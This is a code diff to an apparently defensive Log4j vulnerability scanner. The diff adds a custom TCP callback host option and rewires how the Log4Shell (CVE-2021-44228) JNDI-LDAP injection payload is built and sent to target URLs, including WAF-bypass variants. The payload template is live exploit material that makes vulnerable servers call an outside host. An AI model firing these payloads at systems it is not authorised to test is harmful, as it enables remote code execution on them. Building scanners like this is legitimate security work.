@@ -112,6 +112,10 @@ def parse_args(args_input):
                         dest="custom_dns_callback_host",
                         help="Custom DNS Callback Host.",
                         action='store')
+    parser.add_argument("--custom-tcp-callback-host",
+                        dest="custom_tcp_callback_host",
+                        help="Custom TCP Callback Host.",
+                        action='store')
     parser.add_argument("--basic-auth-user",
                         dest="basic_auth_user",
                         help="Preemptive basic authentication user.",
@@ -287,7 +291,10 @@ def parse_url(url):
 def scan_url(url, callback_host, proxies, args):
     parsed_url = parse_url(url)
     random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
-    payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
+    host_def = '%s.%s' % (parsed_url["host"], callback_host)
+    if args.custom_tcp_callback_host:
+        host_def = callback_host
+    payload = '${jndi:ldap://%s/%s}' % (host_def, random_string)
     payloads = [payload]
     if args.waf_bypass_payloads:
         payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
@@ -376,10 +383,13 @@ def main(options):
             raise ValueError("'--basic-auth-password' is mandatory when basic authentication user is defined.")
         if args.authorization_injection_type != 'none':
             raise ValueError("'--authorization-injection' is not compatible when basic authentication is defined.")
-    dns_callback_host = ""
-    if args.custom_dns_callback_host:
+    callback_host = ""
+    if args.custom_tcp_callback_host:
+        cprint(f"[•] Using custom TCP Callback host [{args.custom_tcp_callback_host}]. No verification will be done after sending fuzz requests.")
+        callback_host = args.custom_tcp_callback_host
+    elif args.custom_dns_callback_host:
         cprint(f"[•] Using custom DNS Callback host [{args.custom_dns_callback_host}]. No verification will be done after sending fuzz requests.")
-        dns_callback_host = args.custom_dns_callback_host
+        callback_host = args.custom_dns_callback_host
     else:
         cprint(f"[•] Initiating DNS callback server ({args.dns_callback_provider}).")
         if args.dns_callback_provider == "interact.sh":
@@ -388,15 +398,19 @@ def main(options):
             dns_callback = Dnslog(proxies=proxies)
         else:
             raise ValueError("Invalid DNS Callback provider")
-        dns_callback_host = dns_callback.domain
+        callback_host = dns_callback.domain
 
     cprint("[%] Checking for Log4j RCE CVE-2021-44228.", "magenta")
     for url in urls:
         cprint(f"[•] URL: {url}", "magenta")
-        scan_url(url, dns_callback_host, proxies, args)
+        scan_url(url, callback_host, proxies, args)
 
     if args.custom_dns_callback_host:
         cprint("[•] Payloads sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.", "cyan")
+        return
+
+    if args.custom_tcp_callback_host:
+        cprint("[•] Payloads sent to all URLs. Custom TCP Callback host is provided, please check TCP receiver logs to verify the existence of the vulnerability. Exiting.", "cyan")
         return
 
     cprint("[•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.", "cyan")
